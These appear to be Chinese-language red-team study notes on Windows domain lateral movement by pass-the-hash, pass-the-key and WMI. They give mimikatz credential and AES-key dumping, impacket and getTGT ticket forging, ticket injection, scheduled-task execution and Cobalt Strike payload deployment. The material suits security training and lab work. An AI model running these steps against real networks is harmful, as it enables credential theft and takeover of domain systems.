PTH

哈希传递攻击
PTH 攻击前提：
• 目标机器开放 445 端口。
• 具备管理员的 NTLM 哈希值，并且目标使用了同样的账号密码。
hashdump拿到本地管理员的NTLM的哈希值,需要管理员权限，到域控执行

相当于ipc连接,此时会弹出一个shell，该 shell 已经和目标主机已经建立了认证，==该认证通过之后可以远程创建、执行计划任务和服务==，从而我们可以直接上线

PTK

攻击原理
PTK(Pass The key)),中文叫秘钥传递攻击，PTH 传递中，使用的是 NTLM-HASH 值进行认证，PTK 使用 AES256 或者 AES128 的方式进行传递，PTK 攻击只能用于kerberos 认证中，NTLM 认证中不存在这一攻击手法。
AES KEY 又分为 256 位和 128 位。AES-KEY 只在 kerberos 认证中使用，所以一般域用户才会有该值。
mimikatz “privilege::debug” “sekurlsa::ekeys” 读取 AES key，可能抓到机器用户

利用条件
1、必须是域环境，使用域账号才能进行 PTK 攻击。
2、kerberos 支持 AES 认证。

使用 impacket-psexec 完成 PTK 攻击:（god 是一个域管账号,这里使用普通域用户可能会失败。）
全域名/用户名@域名地址 -aeskey xxx
gouzi.com/god@dc.gouzi.com -aesKey 8cac5b0cf475d11099d7d9f787f02fac304227bc3b0ae6dab20a318317bfc065

PTK 上线 CS

PTK 本质上也是一种认证，本身不具有攻击性，如果知道一些特殊账号的 KEY 就可以利用 PTK 传递攻击，我们可以 getTGT 工具生成对应账号的 TGT 票据(后缀是ccache)，然后将票据导入到内存中，取得对目标机器的访问权。后续可以使用计划任务、服务等上线 CS。

确认票据：shell klist

管理员读取AES key：mimikatz “privilege::debug” “sekurlsa::ekeys”
（Administrator可能读取不到，这里选择新建域控管理员：AD目录中->user->新建->右键添加到组->输入对象名称选择:Domain Admins->完成切换用户然后登录）

生成 TGT 票据:
getTGT.exe deyu.com/xxx -aesKey bad8a164e3cfa7f5cba1c392a1714cda7673a85599d520c6d4cc54cf933cf279

导入内存:
mimikatz.exe kerberos::ptc xxx.ccache

查看是否导入成功
mimikatz.exe kerberos::list
shell klist
shell dir \192.168.121.xx\c$

传递木马,创建并执行计划任务

删除：shell schtasks /delete /s 192.168.255.10 /u administrator /p Win.2024 /tn ptktest /f
清除票据:
mimikatz kerberos::purge

WMI

在使用 wmiexec 进行横向移动时，不会在系统中留下操作日志，可以在一定程度上规避安全设备(wmic 走的是 rpc 协议)。
WMIC（Windows Management Instrumentation Command-line）是 WMI的一个命令行工具，用于与 WMI 进行交互。是一个比 Windows CMD 更加强大的命令集。
可以使用 WMIC 命令集的强大管理功能和支持远程执行命令的特点，做一些操作，比如：
远程添加管理员

先CS生成payload，output选powershell
远程执行 powershell 上线(网络畅通)

CS上线（rpc协议）

以管理员的身份运行PowerShell
Get-ExecutionPolicy -List 查看当前用户的执行策略
Set-ExecutionPolicy -ExecutionPolicy AllSigned CurrentUser，更改执行策略。运行命令后会有提示信息，然后输入Y确认更改执行策略即可。
利用条件
shell 环境:普通管理员或者域管理员。
目标环境:获取本地 administrator 密码，或者已经取得域管理员以上权限账号的用户密码，或者已经和目标主机建立信任关系。
端口:445 和 135。
